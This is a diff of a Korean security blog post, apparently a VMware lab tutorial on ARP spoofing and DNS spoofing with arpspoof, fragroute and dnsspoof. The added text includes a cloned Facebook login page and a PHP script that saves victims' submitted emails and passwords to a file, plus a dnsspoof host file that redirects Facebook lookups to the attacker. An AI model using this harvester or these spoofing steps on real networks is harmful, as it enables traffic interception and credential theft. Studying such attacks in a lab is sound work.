@@ -9,8 +9,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>ARP Spoofing - dnsniff - 개발새발</title>
-<meta name="description" content="ARP Spoofing">
+<!-- begin _includes/seo.html --><title>Spoofing - 개발새발</title>
+<meta name="description" content="Kali와 CentOS에서 ARP Spoofing과 DNS Spoofing을 실습해보자.">
 
 
   <meta name="author" content="Joonsoo Park">
@@ -22,11 +22,11 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="ko">
 <meta property="og:site_name" content="개발새발">
-<meta property="og:title" content="ARP Spoofing - dnsniff">
-<meta property="og:url" content="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/ARP-Spoofing-and-snort-rule/">
+<meta property="og:title" content="Spoofing">
+<meta property="og:url" content="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Spoofing/">
 
 
-  <meta property="og:description" content="ARP Spoofing">
+  <meta property="og:description" content="Kali와 CentOS에서 ARP Spoofing과 DNS Spoofing을 실습해보자.">
 
 
 
@@ -45,7 +45,7 @@
   
 
 
-<link rel="canonical" href="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/ARP-Spoofing-and-snort-rule/">
+<link rel="canonical" href="http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Spoofing/">
 
 
 
@@ -138,6 +138,8 @@
               <a href="/sitemap/">Sitemap</a>
             </li><li class="masthead__menu-item">
               <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
             </li><li class="masthead__menu-item">
               <a href="https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/">Quick-Start Guide</a>
             </li></ul>
@@ -276,15 +278,15 @@
 
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="ARP Spoofing - dnsniff">
-    <meta itemprop="description" content="ARP Spoofing">
+    <meta itemprop="headline" content="Spoofing">
+   <meta itemprop="description" content="Kali와 CentOS에서 ARP Spoofing과 DNS Spoofing을 실습해보자.">
     <meta itemprop="datePublished" content="2020-11-04T00:00:00+00:00">
     
 
     <div class="page__inner-wrap">
       
         <header>
-          <h1 id="page-title" class="page__title" itemprop="headline">ARP Spoofing - dnsniff
+          <h1 id="page-title" class="page__title" itemprop="headline">Spoofing
 </h1>
           
 
@@ -294,9 +296,20 @@
 
       <section class="page__content" itemprop="text">
         
-        <p>ARP Spoofing</p>
+        <p>Kali와 CentOS에서 ARP Spoofing과 DNS Spoofing을 실습해보자.</p>
 
-<p>dnsniff</p>
+<font color="#ffcc66">IP Spoofing</font>
+<p>IP Spoofing이란 자신의 ip를 변조해 자신이 만든 패킷을 다른 컴퓨터가 만든 패킷처럼 만드는 것이다.</p>
+
+<font color="#ffcc66">Fragroute</font>
+
+<p>포트 포워딩을 해주는 도구. 
+ARP Spoofing을 하게 되면 자신에게 패킷이 오게 되는데, 이후 다시 피해자가 지정한 곳에 피해자의 패킷을 보내주기 위해 사용한다. 만약 이를 사용하지 않으면 피해자의 패킷이 나에게만 오고 전달되야할 곳에 전달이 안되서 피해자가 정상적인 네트워크를 사용하지 못한다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fragroute -B1
+</code></pre></div></div>
+
+<font color="#ffcc66">ARP Spoofing</font>
 
 <p>VMWARE 등의 가상 장비를 사용해서 
 arp -a : 현재 MAC 테이블 확인</p>
@@ -305,19 +318,64 @@ arp -a : 현재 MAC 테이블 확인</p>
 
 <p>arpspoof -i [인터페이스 이름] [target ip] [gateway ip]</p>
 
+<p>와이어샤크를 이용해 패킷을 확인해 보면 target에서 내 ip를 
+통해 패킷을 보내고 내 PC에서 게이트웨이에 다시 패킷을 보내 도청하고 있는 것을 알 수 있다. 여기서 응용해 DNS Spoofing을 해보자.</p>
+
+<font color="#ffcc66">DNS Spoofing</font>
+
+<p>공격자의 apache2를 실행해주고 피해자가 지정된 domain에 접근시 공격자의 html로 접근해 피해자가 입력하는 정보를 탈취하는 방법을 실습해보자.</p>
+
+<p>facebook.html을 다운 받고 이를 /etc/www/html에 삽입해주자. 파일명은 index.html로 만들어주자. index.html에서 
+method 옆 action 기존 내용을 지우고 php파일을 삽입해주자.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>action="post.php" method=POST
+</code></pre></div></div>
+
+<p>action에 지정된 post.php 파일을 생성해 주자.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$file</span><span class="o">=</span><span class="s2">"post.txt"</span><span class="p">;</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">,</span> <span class="kc">true</span><span class="p">),</span> <span class="no">FILE_APPEND</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0; url=http://www.facebook.com"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>이 php는 post.txt에 피해자가 입력한 정보를 입력해주고 피해자를 다시 원래의 facebook으로 접속하게 해준다. 이제 dnsspoof를 이용하기 위해 host.txt 파일을 생성해 주자. dnsspoof의 경우 파일을 통해 호스트와 url을 지정해 줄 수 있다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[피해자 ip] *.facebook.com
+</code></pre></div></div>
+
+<p>그리고 이제 이 파일을 이용해서 dnsspoof 명령어를 실행해주자.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnsspoof -i [인터페이스 이름] -f /경로/hosts.host
+</code></pre></div></div>
+
+<p>이제 피해자 PC에서 nscd를 이용해 dns를 초기화해줘야 한다.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl restart nscd
+</code></pre></div></div>
+<p>이 후에 피해자 컴퓨터에서 페이스북에 접근을 시도하면, 아까 지정해준 공격자의 index.html에 접근하게 되고 피해자가 e-mail과 비밀번호를 입력할 시 아까 생성한 post.txt에 입력된다.</p>
+
+<font color="#ffcc66">이 방법이 성공하지 않을 수 있다.</font>
+<p>이러한 공격을 막기 위해 웹 브라우저에서 자체적으로 보통 차단하기 때문에 성공하지 않을 수 있다. 만약에 이를 해결하는 경우 댓글로 알려주시면 감사하겠습니다.</p>
+
+<font color="#ffcc66">네트워크 인터페이스가 다를 경우</font>
+
 <p>VMware를 사용해 실습할 경우 각 OS의 네트워크 인터페이스가 다를 수가 있다. kali는 eth0인데 서버는 ens33이라던지. 이 경우 /etc/default/grub 파일을 수정해 주면 된다.(centOS 기준)
-GRUB_CMDLINE_LINUX
-/swap []net.ifnames=0] rhgb quite</p>
+GRUB_CMDLINE_LINUX 부분에
+/swap 이 부분 뒤 <font color="#ffcc66"> [net.ifnames=0] rhgb quite </font> 이렇게 수정해주도록 하자.</p>
 
-<p># grub2-mkconfig -o /boot/grub2grub.cfg</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grub2-mkconfig -o /boot/grub2grub.cfg  
 
-<p>cd /etc/sysconfig/network-scripts</p>
+cd /etc/sysconfig/network-scripts  
 
-<p>mv ifcfg-ens33 ifcfg-eth0</p>
+mv ifcfg-ens33 ifcfg-eth0  
 
-<p>vi ifcfg-eth0</p>
+vi ifcfg-eth0  
+</code></pre></div></div>
 
-<p>그 후 재부팅 후 네트워크를 확인하면 이름이 변경된 것을 알 수 있다.</p>
+<p>생성된 ifcfg에서 name과 device 태그를 eth0로 변경해주자.
+재부팅 후 네트워크를 확인하면 이름이 변경된 것을 알 수 있다.</p>
 
         
       </section>
@@ -357,11 +415,11 @@ GRUB_CMDLINE_LINUX
     <h4 class="page__share-title">공유하기</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?text=ARP+Spoofing+-+dnsniff%20http%3A%2F%2F0.0.0.0%3A4000%2F%25EC%25A0%2595%25EB%25B3%25B4%25EB%25B3%25B4%25EC%2595%2588%2FARP-Spoofing-and-snort-rule%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=Spoofing%20http%3A%2F%2F0.0.0.0%3A4000%2F%25EC%25A0%2595%25EB%25B3%25B4%25EB%25B3%25B4%25EC%2595%2588%2FSpoofing%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2F%25EC%25A0%2595%25EB%25B3%25B4%25EB%25B3%25B4%25EC%2595%2588%2FARP-Spoofing-and-snort-rule%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2F%25EC%25A0%2595%25EB%25B3%25B4%25EB%25B3%25B4%25EC%2595%2588%2FSpoofing%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2F0.0.0.0%3A4000%2F%25EC%25A0%2595%25EB%25B3%25B4%25EB%25B3%25B4%25EC%2595%2588%2FARP-Spoofing-and-snort-rule%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2F0.0.0.0%3A4000%2F%25EC%25A0%2595%25EB%25B3%25B4%25EB%25B3%25B4%25EC%2595%2588%2FSpoofing%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -372,7 +430,7 @@ GRUB_CMDLINE_LINUX
 ">이전</a>
     
     
-      <a href="/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/" class="pagination--pager" title="DDoS 공격 - hping3
+      <a href="/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/" class="pagination--pager" title="DoS 공격 - LAND ATTACK, DDoS
 ">다음</a>
     
   </nav>
@@ -397,14 +455,14 @@ GRUB_CMDLINE_LINUX
     
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
-        <a href="/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/" rel="permalink">DDoS 공격 - hping3
+        <a href="/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Network-Attack-With-HPING3/" rel="permalink">DoS 공격 - LAND ATTACK, DDoS
 </a>
       
     </h2>
     
 
 
-    <p class="archive__item-excerpt" itemprop="description">LAND Attack
+    <p class="archive__item-excerpt" itemprop="description">hping3를 이용해 DoS 공격을 시도해보자.
 </p>
   </article>
 </div>
@@ -490,8 +548,8 @@ GRUB_CMDLINE_LINUX
     
   <script>
     var disqus_config = function () {
-      this.page.url = "http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/ARP-Spoofing-and-snort-rule/";  /* Replace PAGE_URL with your page's canonical URL variable */
-      this.page.identifier = "/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/ARP-Spoofing-and-snort-rule"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+      this.page.url = "http://0.0.0.0:4000/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Spoofing/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/Spoofing"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
     };
     (function() { /* DON'T EDIT BELOW THIS LINE */
       var d = document, s = d.createElement('script');
